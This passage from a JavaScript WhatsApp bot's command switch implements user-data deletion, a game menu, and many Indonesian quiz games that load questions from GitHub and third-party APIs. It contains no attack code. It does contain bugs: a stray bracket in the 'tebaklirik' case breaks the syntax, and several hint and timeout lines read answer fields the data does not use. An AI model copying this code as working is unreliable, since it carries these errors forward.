    let targetNumber = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    if (!db.data.users[targetNumber]?.daftar) {
        replyText += `Hmm, number *${args[0]}* isn't registered yet, bro. 😊`;
        return newReply(replyText);
    }
    try {
        delete db.data.users[targetNumber];
        replyText += `User data with number *${args[0]}* successfully deleted! 😊`;
        newReply(replyText);
    } catch (e) {
        console.error(e);
        replyText += 'Oops, I failed to delete this user data. Try again later, bro. 😔';
        newReply(replyText);
    }
    break;
}

case 'game':
case 'tebak': {
    try {
        const button = [{
            "name": "single_select",
            "buttonParamsJson": JSON.stringify({
                "title": "🎮 Choose Exciting Games!",
                "sections": [
                    {
                        "title": "🧩 General Quizzes",
                        "rows": [
                            { "header": "📍 Guess District", "title": "Guess district names in Indonesia!", "id": ".tebakkabupaten" },
                            { "header": "🎤 Guess JKT48", "title": "Test your knowledge about JKT48!", "id": ".tebakjkt48" },
                            { "header": "🐾 Guess Animal", "title": "Guess animals from their characteristics!", "id": ".tebakhewan" },
                            { "header": "🛡️ Guess ML", "title": "Guess Mobile Legends heroes!", "id": ".tebakml" },
                            { "header": "🎭 Guess Chara", "title": "Recognize anime & game characters!", "id": ".tebakchara" },
                            { "header": "🏢 Guess Logo", "title": "Guess logos from various brands!", "id": ".tebaklogo" },
                            { "header": "📱 Guess Application", "title": "Guess app names from icons!", "id": ".tebakaplikasi" }
                        ]
                    },
                    {
                        "title": "🔥 Popular Games",
                        "rows": [
                            { "header": "💥 Guess FF", "title": "Guess Free Fire items and characters!", "id": ".tebakff" },
                            { "header": "⚔️ Guess Hero", "title": "Recognize heroes from various games!", "id": ".tebakhero" },
                            { "header": "🎮 Guess Game", "title": "Guess game titles from clues!", "id": ".tebakgame" },
                            { "header": "🖼️ Guess Picture", "title": "Guess what's in the picture!", "id": ".tebakgambar" },
                            { "header": "🚩 Guess Flag", "title": "Guess country flags around the world!", "id": ".tebakbendera" }
                        ]
                    },
                    {
                        "title": "📝 Creative Quizzes",
                        "rows": [
                            { "header": "✍️ Complete Sentence", "title": "Complete unfinished sentences!", "id": ".lengkapikalimat" },
                            { "header": "🧠 Brain Teaser", "title": "Logical thinking questions!", "id": ".asahotak" },
                            { "header": "🔤 Guess Word", "title": "Find hidden words!", "id": ".tebakkata" },
                            { "header": "💭 Guess Puzzle", "title": "Exciting crossword puzzles!", "id": ".tebaktebakan" },
                            { "header": "🎶 Guess Lyrics", "title": "Complete missing song lyrics!", "id": ".tebaklirik" },
                            { "header": "🧪 Guess Chemistry", "title": "Test your chemistry knowledge!", "id": ".tebakkimia" },
                            { "header": "❓ Guess Who", "title": "Guess people's names from clues!", "id": ".tebaksiapa" },
                            { "header": "📝 Guess Sentence", "title": "Guess the meaning of a sentence!", "id": ".tebakkalimat" }
                        ]
                    }
                ]
            })
        }];
        let caption = `*🎮 Choose the Game You Want to Play!*\n\n`;
        caption += `Choose a game from the list below to start! Click the button below!\n\n`;
        caption += `_*Have fun playing and enjoy!*_`;
        await sock.sendButtonText(m.chat, button, caption, 'Choose Game', m);
    } catch (err) {
        console.error(err);
        newReply(`⚠️ An error occurred: ${err.message}`);
    }
    break;
}

case 'tebakgambar': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tebakgambar[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.img
                },
                caption: `Please Answer the Question Above\n\nDescription: ${result.deskripsi}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebakgambar[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tebakgambar[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break
case 'tebakgame': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/qisyana/scrape/main/tebakgame.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tebakgame[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.img
                },
                caption: `What game is the picture above?\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebakgame[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tebakgame[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakhero': {
    const gamecek = await cekgame(m.chat);
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);

    try {
        // Call API to get Mobile Legends hero data
        let anu = await fetchJson('https://api.siputzx.my.id/api/games/tebakheroml'); // Replace with appropriate API URL
        let result = anu.data;
        console.log("Answer: " + result.name);

        // Save tebakhero game session for this chat
        tebakhero[m.chat] = [
            await sock.sendMessage(m.chat, {
                audio: {
                    url: result.audio // Hero audio from API
                },
                caption: `Please Guess the Hero Based on This Audio\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }),
            result, // Save hero data for reference
            250, // Reward for correct answer
            setTimeout(() => {
                if (tebakhero[m.chat]) {
                    waktuHabis(result.name); // Run function if time runs out
                    delete tebakhero[m.chat]; // Delete game session after time runs out
                }
            }, 120000) // 2 minute duration for playing
        ];

    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    }
}
break;

case 'tebakff': {
    const gamecek = await cekgame(m.chat);
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);

    try {
        // Call API to get Free Fire characters
        let anu = await fetchJson('https://api.siputzx.my.id/api/games/karakter-freefire');
        let result = anu.data;
        console.log("Answer: " + result.name);

        // Save tebakff game session for this chat
        tebakff[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.gambar // Character image from API
                },
                caption: `Who is the name of the character in the picture above?\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }),
            result, // Save character data for reference
            250, // Reward for correct answer
            setTimeout(() => {
                if (tebakff[m.chat]) {
                    waktuHabis(result.jawaban); // Run function if time runs out
                    delete tebakff[m.chat]; // Delete game session after time runs out
                }
            }, 120000) // 2 minute duration for playing
        ];

    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    }
}
break;

case 'tebakkabupaten': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let result = await fetchJson('https://api.siputzx.my.id/api/games/kabupaten')
        console.log("Answer: " + result.title)
        tebakkabupaten[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.url
                },
                caption: `Which District Logo Is This?\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebakkabupaten[m.chat]) {
                    waktuHabis(result.title)
                    delete tebakkabupaten[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakjkt48': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let result = await fetchJson('https://api.siputzx.my.id/api/games/tebakjkt')
        console.log("Answer: " + result.jawaban)
        tebakjkt48[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.img
                },
                caption: `What is the Name of This JKT48 Member?\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebakjkt48[m.chat]) {
                    waktuHabis(result.name)
                    delete tebakjkt48[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakhewan': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://api.siputzx.my.id/api/games/tebakhewan')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.title)
        tebakhewan[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.url
                },
                caption: `What Animal Is This?\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebakhewan[m.chat]) {
                    waktuHabis(result.title)
                    delete tebakhewan[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakanime':
case 'tebakchara': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let res = await fetchJson('https://www.sock.my.id/cdn/game/characters.json')
        let anu = res.data
        let result = await pickRandom(anu)
        console.log("Answer: " + result.name)
        tebakchara[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.images.jpg.image_url
                },
                caption: `What is the Name of This Character?\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebakchara[m.chat]) {
                    waktuHabis(result.name)
                    delete tebakchara[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebaklogo': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://www.sock.my.id/cdn/game/tebaklogo.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tebaklogo[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.img
                },
                caption: `*What Logo Is This?*\n\n${result.deskripsi}\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebaklogo[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tebaklogo[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakaplikasi': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://www.sock.my.id/cdn/game/tebakaplikasi.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tebakaplikasi[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.image
                },
                caption: `The picture above is an application?\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebakaplikasi[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tebakaplikasi[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakkata': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tebakkata[m.chat] = [
            await sock.sendText(m.chat, `Please Answer the Following Question\n\n${result.soal}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (tebakkata[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tebakkata[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'asahotak': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://www.sock.my.id/cdn/game/asahotak.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        asahotak[m.chat] = [
            await sock.sendText(m.chat, `Please Answer the Following Question\n\n${result.soal}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (asahotak[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete asahotak[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'lengkapikalimat': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://www.sock.my.id/cdn/game/lengkapikalimat.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        lengkapikalimat[m.chat] = [
            await sock.sendText(m.chat, `Please Answer the Following Question\n\n${result.soal}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (lengkapikalimat[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete lengkapikalimat[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakbendera': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.name)
        tebakbendera[m.chat] = [
            await sock.sendMessage(m.chat, {
                image: {
                    url: result.img
                },
                caption: `The picture above is a country flag?\n\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`
            }, {
                quoted: m
            }), result, 250,
            setTimeout(() => {
                if (tebakbendera[m.chat]) {
                    waktuHabis(result.name)
                    delete tebakbendera[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakkalimat': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tebakkalimat[m.chat] = [
            await sock.sendText(m.chat, `Please Answer the Following Question\n\n${result.soal}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (tebakkalimat[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tebakkalimat[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebaksiapa': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        siapaaku[m.chat] = [
            await sock.sendText(m.chat, `Please Answer the Following Question\n\n${result.soal}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (siapaaku[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete siapaaku[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebakkimia': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.unsur)
        tebakkimia[m.chat] = [
            await sock.sendText(m.chat, `What is the Meaning of Symbol : *${result.lambang}*?\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (tebakkimia[m.chat]) {
                    waktuHabis(result.unsur)
                    delete tebakkimia[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebaklirik': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tebaklirik[m.chat] = [
            await sock.sendText(m.chat, `This is a Lyric From the Song? : *${result.soal}*?\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (tebaklirik[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tebaklirik[m.chat]
                }
            }, 120000)
        ]
    ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tebaktebakan': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tebaktebakan[m.chat] = [
            await sock.sendText(m.chat, `Please Answer the Following Question\n\n${result.soal}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (tebaktebakan[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tebaktebakan[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'susunkata': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        susunkata[m.chat] = [
            await sock.sendText(m.chat, `*Answer the Following Question:*\nQuestion: ${result.soal}\nType: ${result.tipe}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (susunkata[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete susunkata[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break
case 'caklontong': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        caklontong[m.chat] = [
            await sock.sendText(m.chat, `*Answer the Following Question:*\nQuestion: ${result.soal}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (caklontong[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete caklontong[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'tekateki': {
    const gamecek = await cekgame(m.chat)
    if (gamecek) return newReply('There\'s still an unfinished session!');
    if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
    try {
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')
        let result = await pickRandom(anu)
        console.log("Answer: " + result.jawaban)
        tekateki[m.chat] = [
            await sock.sendText(m.chat, `Please Answer the Following Question\n\n${result.soal}\nTime: ${(120000 / 1000).toFixed(2)} seconds\n\n_Type .giveup To Give Up..._\n_Type .help For Hint..._`, m), result, 250,
            setTimeout(() => {
                if (tekateki[m.chat]) {
                    waktuHabis(result.jawaban)
                    delete tekateki[m.chat]
                }
            }, 120000)
        ]
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'bantuan': {
    try {
        if (m.chat in tebakgambar) {
            let json = tebakgambar[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakgame) {
            let json = tebakgame[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakhero) {
            let json = tebakhero[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakff) {
            let json = tebakff[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakkabupaten) {
            let json = tebakkabupaten[m.chat][1]
            newReply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakjkt48) {
            let json = tebakjkt48[m.chat][1]
            newReply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakhewan) {
            let json = tebakhewan[m.chat][1]
            newReply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakml) {
            let json = tebakml[m.chat][1]
            newReply('```' + json.title.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakchara) {
            let json = tebakchara[m.chat][1]
            newReply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebaklogo) {
            let json = tebaklogo[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakaplikasi) {
            let json = tebakaplikasi[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakkata) {
            let json = tebakkata[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in asahotak) {
            let json = asahotak[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in lengkapikalimat) {
            let json = lengkapikalimat[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakbendera) {
            let json = tebakbendera[m.chat][1]
            newReply('```' + json.name.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakkalimat) {
            let json = tebakkalimat[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in siapaaku) {
            let json = siapaaku[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebakkimia) {
            let json = tebakkimia[m.chat][1]
            newReply('```' + json.unsur.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebaklirik) {
            let json = tebaklirik[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tebaktebakan) {
            let json = tebaktebakan[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in susunkata) {
            let json = susunkata[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in caklontong) {
            let json = caklontong[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
        if (m.chat in tekateki) {
            let json = tekateki[m.chat][1]
            newReply('```' + json.jawaban.replace(/[bcdfghjklmnpqrstvwxyz]/ig, '_') + '```')
        }
    } catch (error) {
        console.log(error);
        newReply('*Failed to load database from server*. ☹️');
    };
}
break

case 'nyerah': {
    try {
        if (m.chat in siapaaku) {
            clearTimeout(siapaaku[m.chat][3])
            delete siapaaku[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakkalimat) {
            clearTimeout(tebakkalimat[m.chat][3])
            delete tebakkalimat[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakbendera) {
            clearTimeout(tebakbendera[m.chat][3])
            delete tebakbendera[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakkata) {
            clearTimeout(tebakkata[m.chat][3])
            delete tebakkata[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in asahotak) {
            clearTimeout(asahotak[m.chat][3])
            delete asahotak[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in lengkapikalimat) {
            clearTimeout(lengkapikalimat[m.chat][3])
            delete lengkapikalimat[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakgame) {
            clearTimeout(tebakgame[m.chat][3])
            delete tebakgame[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakhero) {
            clearTimeout(tebakhero[m.chat][3])
            delete tebakhero[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakff) {
            clearTimeout(tebakff[m.chat][3])
            delete tebakff[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakkabupaten) {
            clearTimeout(tebakkabupaten[m.chat][3])
            delete tebakkabupaten[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakjkt48) {
            clearTimeout(tebakjkt48[m.chat][3])
            delete tebakjkt48[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakhewan) {
            clearTimeout(tebakhewan[m.chat][3])
            delete tebakhewan[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakml) {
            clearTimeout(tebakml[m.chat][3])
            delete tebakml[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
            })
        }
        if (m.chat in tebakchara) {
            clearTimeout(tebakchara[m.chat][3])
            delete tebakchara[m.chat]
            return sock.sendMessage(m.chat, {
                text: `_Weakkk_ 😏👎`
            }, {
                quoted: m
